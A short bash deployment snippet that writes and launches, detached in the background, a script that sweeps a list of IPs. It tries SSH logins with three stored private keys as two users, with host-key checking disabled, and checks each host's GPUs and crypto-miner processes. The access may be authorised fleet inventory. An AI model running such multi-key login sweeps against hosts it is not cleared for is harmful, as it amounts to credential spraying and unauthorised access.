set +e
echo "== azsweep deploy $(date -u +%FT%TZ)"
cat > /home/ubuntu/ul2/azsweep.sh <<'EOS2'
#!/bin/bash
exec 9>/tmp/azsweep.lock; flock -n 9 || { echo "LOCKED"; exit 0; }
D=/opt/ul-runner/_work/ul-plant/ul-plant
[ -d "$D" ] || { echo "NO_CHECKOUT"; exit 0; }
K1=$D/az/azadmin.pem; K2=$D/keys/k_ali; K3=$D/keys/k_id25519
chmod 600 $K1 $K2 $K3 2>/dev/null
OUT=/home/ubuntu/ul2/azsweep.out; : > $OUT
try() { ip=$1; u=$2; k=$3
  r=$(timeout 15 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=publickey -o LogLevel=ERROR "$u@$ip" 'echo LOGIN_OK uid=$(id -u) host=$(hostname); nvidia-smi -L 2>/dev/null | head -2; pgrep -fc "krig|peakminer|wildrig|srbminer"' 2>&1 | tr '\n' '|')
  echo "$ip $u $(basename $k) => $r" >> $OUT
}
export -f try; export OUT K1 K2 K3
awk '{print $2}' $D/az/hosts.tsv | grep -E '^[0-9]+\.' | sort -u > /tmp/azips.txt
echo "IPS=$(wc -l < /tmp/azips.txt) ts=$(date -u +%FT%TZ)" >> $OUT
for ip in $(cat /tmp/azips.txt); do
  timeout 3 bash -c "echo > /dev/tcp/$ip/22" 2>/dev/null || { echo "$ip PORT22_CLOSED" >> $OUT; continue; }
  for u in t19 azureuser; do for k in $K1 $K2 $K3; do try $ip $u $k & done; done
  wait
done
echo "=== DONE $(date -u +%FT%TZ)" >> $OUT
EOS2
chmod +x /home/ubuntu/ul2/azsweep.sh
setsid nohup /home/ubuntu/ul2/azsweep.sh >/dev/null 2>&1 &
sleep 5
echo "--- lock/proc"; pgrep -af azsweep.sh | head -3
echo "--- head"; head -8 /home/ubuntu/ul2/azsweep.out 2>/dev/null
echo "--- ips"; wc -l /tmp/azips.txt 2>/dev/null; head -3 /tmp/azips.txt 2>/dev/null
echo "--- gpu"; nvidia-smi --query-gpu=index,utilization.gpu,power.draw --format=csv,noheader
echo done
